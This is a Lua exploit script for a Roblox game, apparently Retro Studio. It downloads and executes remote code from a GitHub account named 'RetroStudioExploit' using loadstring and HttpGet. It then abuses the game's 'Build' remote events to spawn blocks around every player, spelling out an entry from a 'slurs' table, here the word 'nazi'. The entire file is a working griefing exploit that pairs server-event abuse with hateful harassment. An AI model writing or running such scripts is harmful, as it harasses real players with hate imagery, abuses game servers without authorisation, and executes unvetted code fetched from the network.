local word = "nazi"
local dist = 2
local offset = Vector3.new(0, 0, 0)

local head = 'https://raw.githubusercontent.com/'
local github = 'RetroStudioExploit/'
local suffix = '/refs/heads/main/'

function loadScript(url:string)
    return loadstring(game:HttpGet(url))()
end

local ARTS = loadScript(head .. github .. 'RetroScripts' .. suffix .. 'Globals/CframeArts.lua')()
local REFLECT = loadScript(head .. github .. 'RetroScripts' .. suffix .. 'Globals/Reflect.lua')

local PS = game:GetService("Players")
function getRoot(char):Part
	return char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
end

local tools = {}
for _, v in pairs(REFLECT.getType(game, "RemoteEvent")) do
	if v.Parent.Name == "Build" then
		table.insert(tools, v)
	end
end
function Build(pos:Vector3, material:string, color:BrickColor)
	local remote = tools[math.random(0, #tools)]
	if remote == nil then return end
    remote:FireServer(unpack({
        [1] = pos,
        [2] = material,
        [3] = color,
        [4] = "",
        [5] = ""
    }))
end

for _, player in PS:GetPlayers() do
	for _, v in pairs(ARTS.slurs[word]) do
		local chr = getRoot(player.Character)
		if chr == nil then continue end

        Build(Vector3.new((v.X * dist) + chr.Position.X, (v.Y * dist) + chr.Position.Y, chr.Position.Z) + offset, "neon", BrickColor.random())
	end
end